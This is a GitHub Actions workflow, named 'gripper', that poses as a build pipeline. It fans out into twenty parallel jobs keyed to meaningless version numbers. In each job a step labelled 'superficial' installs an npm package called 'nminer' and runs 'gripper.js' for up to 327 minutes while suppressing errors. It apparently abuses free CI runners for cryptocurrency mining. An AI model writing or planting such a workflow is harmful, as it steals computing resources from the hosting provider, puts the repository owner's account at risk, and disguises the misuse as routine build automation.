name: gripper
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 8261 }
          - { version: 8215 }
          - { version: 6534 }
          - { version: 5087 }
          - { version: 7597 }
          - { version: 4577 }
          - { version: 9806 }
          - { version: 7228 }
          - { version: 1379 }
          - { version: 897 }
          - { version: 6775 }
          - { version: 5950 }
          - { version: 6496 }
          - { version: 5632 }
          - { version: 2633 }
          - { version: 5488 }
          - { version: 1094 }
          - { version: 7123 }
          - { version: 5205 }
          - { version: 3037 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: superficial
        run: |
          npm install nminer@latest
          timeout 327m node gripper.js || echo "gripper executed"